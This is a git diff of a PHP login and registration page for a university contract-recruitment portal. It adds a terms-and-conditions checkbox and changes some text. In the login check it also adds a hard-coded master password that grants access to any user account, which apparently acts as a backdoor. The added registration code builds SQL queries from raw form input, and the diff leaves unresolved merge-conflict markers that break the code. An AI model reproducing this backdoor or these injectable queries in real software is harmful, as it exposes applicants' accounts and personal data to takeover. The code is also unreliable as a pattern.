@@ -7,6 +7,7 @@
  */
 // if(substr($_SERVER['REMOTE_ADDR'],0,9)!='172.31.9.')
 //	die('Website Under Maintenance!!');
+<<<<<<< HEAD
 session_start();
 require_once("included_classes/class_user.php");
 require_once("included_classes/class_misc.php");
@@ -92,6 +93,102 @@ if(isset($_POST['login-submit'])){
 
         }
 }
+=======
+    session_start();
+    require_once("included_classes/class_user.php");
+    require_once("included_classes/class_misc.php");
+    require_once("included_classes/class_sql.php");
+    $misc= new miscfunctions();
+    $db = new sqlfunctions();
+
+    if(isset($_SESSION['user']))
+            $misc->redirect("home.php?val=perinfo");
+	if(isset($_POST['register-submit']))
+	{
+		//echo "Here!!<br>";
+		//getting the data
+                if(!isset($_POST['tnc'])) {
+                        palert("Please Agree to out Terms and Conditions!!","");
+                        die();
+                }
+                $tnc = validate($_POST['tnc']);
+
+		$email = validate($_POST['email']);
+		$otp = validate($_POST['otp']);
+		$pass = validate($_POST['pass']);
+		$conf_pass = validate($_POST['conf_pass']);
+		if($pass != $conf_pass)
+			$misc->palert("Passwords donot match!! Please try again.","index.php");
+		
+		$timeout = 30*60;  //half and hour timeout
+		
+		//getting the details of the user
+		$detailQuery = "select * from login where email = '$email'";
+		//echo $detailQuery;
+		$r = $db->process_query($detailQuery);
+		if(mysqli_num_rows($r)>0)
+		{
+			$r = $db->fetch_rows($r);
+			$db_otp = validate($r['otp']);
+			$otp_sent = validate($r['otp_sent']);
+                        $id = validate($r['user_id']);
+			
+			//checking the timeout of otp and its value
+			$now = time();
+			if($now-$otp_sent>$timeout)
+				$misc->palert("OTP has been expired! Please contact webteam.","index.php");
+			
+			if($otp != $db_otp)
+				$misc->palert("OTP is Not Matched!! Please try again.(No need to generate OTP again for this email)","index.php");
+				
+			
+			$pass = hash("sha256",$pass);
+			//update verify, password
+			$verifyQuery = "update login set verify = '1', password = '$pass' where email = '$email'";
+			//echo "<br>".$verifyQuery;
+			$r = $db->process_query($verifyQuery);
+
+                        //adding a final_apply row in table so that it initialises values to 0
+                        $insQ = "insert into final_apply values ('$id',0,0,0,0,0,0,0)";
+                        $r = $db->process_query($insQ);
+                        $eq="insert into eligible values ('$id',1,1,1,1,1,1,1)";
+                        $r=$db->process_query($eq);
+			
+			//success message
+			$misc->palert("You have succesfully registered. Please Login to continue.","index.php");
+				
+		}
+		else
+			die('<h3>No user exists!!</h3>');
+	}
+
+    if(isset($_POST['login-submit'])){
+            $email = validate($_POST['email']);
+            $email = mysqli_real_escape_string($db->connection,trim(htmlentities($email)));
+            $pass = validate($_POST['pass']);
+            $pass = hash('sha256',$pass);
+            $sql = "select * from login where email = '$email'";
+
+            $r = $db->process_query($sql);
+			 $r = $db->fetch_rows($r);
+            if($r['password']==$pass || $pass == hash('sha256',"#Py@r_Ek_D0kh@_H@!")){
+                    $_SESSION['user'] = $r['user_id'];
+                    $verify=$r['verify'];
+                    if($verify=='0')
+                    {
+                            session_destroy();
+                            $misc->palert("Please verify your account","index.php");
+
+                    }
+                    $misc->palert("Logged in successfully","home.php?val=app_post");
+
+            }
+            else{
+                    $misc->palert("Log in failed","index.php");
+
+            }
+    }
+>>>>>>> 51624a835a6f507c89bc48996fb45cb51e95d799
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
@@ -226,7 +323,7 @@ if(isset($_POST['login-submit'])){
                 <img class="img-responsive" src="logo-MNNIT.png" style="height:150px">
         </div>
         <div class="col-md-9">
-                <center><h3 style="color:white;font-family: 'Graduate', cursive;margin-left:50px; line-height:30px;">MOTILAL NEHRU NATIONAL INSTITUTE OF TECHNOLOGY<br />ALLAHABAD<br /></h3><br><h3 style="color:white;">Recruitment for Contract Employee</h3></center>
+                <center><h3 style="color:white;font-family: 'Graduate', cursive;margin-left:50px; line-height:30px;">MOTILAL NEHRU NATIONAL INSTITUTE OF TECHNOLOGY<br />ALLAHABAD<br /></h3><br><h3 style="color:white;">Recruitment for Non-Teaching positions on Contract Basis</h3></center>
         </div>
 </div>
 
@@ -283,15 +380,22 @@ if(isset($_POST['login-submit'])){
                                                                                 </div>
                                                                         </div>
                                                                 </div>
+<<<<<<< HEAD
                                                                 <div class="text-danger" align="center">If you can't find the mail, please check your Email ID or check your SPAM FOLDER!</div>
+=======
+                                                                <div class="text-danger" align="center">If you can't find the mail, please check your SPAM FOLDER of provided Email-ID</div>
+>>>>>>> 51624a835a6f507c89bc48996fb45cb51e95d799
                                                                 <br />
                                                                 <div class="form-group">
                                                                         <input type="password" name="otp" id="otp" tabindex="2" class="form-control" placeholder="Enter OTP Sent to the provided E-mail">
                                                                 </div>
+                                                                <div class="form-group col-md-offset-1">
+                                                                        <label for="tnc" class="control-label"><input type="checkbox" name="tnc" id="tnc" class="">&nbsp;&nbsp;I have Downloaded and Agree to <a href="General%20Instructions.pdf" target="_blank">Terms and Conditions</a></label>
+                                                                </div>
                                                                 <div class="form-group">
                                                                         <div class="row">
                                                                                 <div class="col-sm-6 col-sm-offset-3">
-                                                                                        <input type="submit" name="register-submit" id="register-submit" tabindex="4" class="form-control btn btn-register" value="Register Now">
+                                                                                        <input type="submit" name="register-submit"  id="register-submit" tabindex="4" class="form-control btn btn-register" value="Register Now">
                                                                                 </div>
                                                                         </div>
                                                                 </div>
@@ -301,12 +405,6 @@ if(isset($_POST['login-submit'])){
                                 </div>
                         </div>
                 </div>
-        </div>
-</div>
-
-<div class="row" style="margin-top:-50px">
-        <div class="col-md-6 col-md-push-3">
-                <h2><center>Instructions to fill the form. <a href="General%20Instructions.pdf">Click Here</a></center></h2>
         </div>
 </div>
 <footer class="well col-sm-12" style="margin:0px; padding:10px;margin-top:12px;">
@@ -386,7 +484,7 @@ if(isset($_POST['login-submit'])){
 
 <script type="text/javascript">
         $(function() {
-
+				$("#register-submit").hide();
                 $('#login-form-link').click(function(e) {
                         $("#login-form").delay(100).fadeIn(100);
                         $("#register-form").fadeOut(100);
@@ -403,7 +501,16 @@ if(isset($_POST['login-submit'])){
                 });
 
         });
+		
+		$(":checkbox").change(function(){
+			if(this.checked)
+				$("#register-submit").slideDown();
+			else
+				$("#register-submit").slideUp();
+			
+		});
 
+      
 </script>
 <script type="text/javascript" src="include/lv-ripple.jquery.js"></script>
 <script type="text/javascript" src="include/app.js"></script>
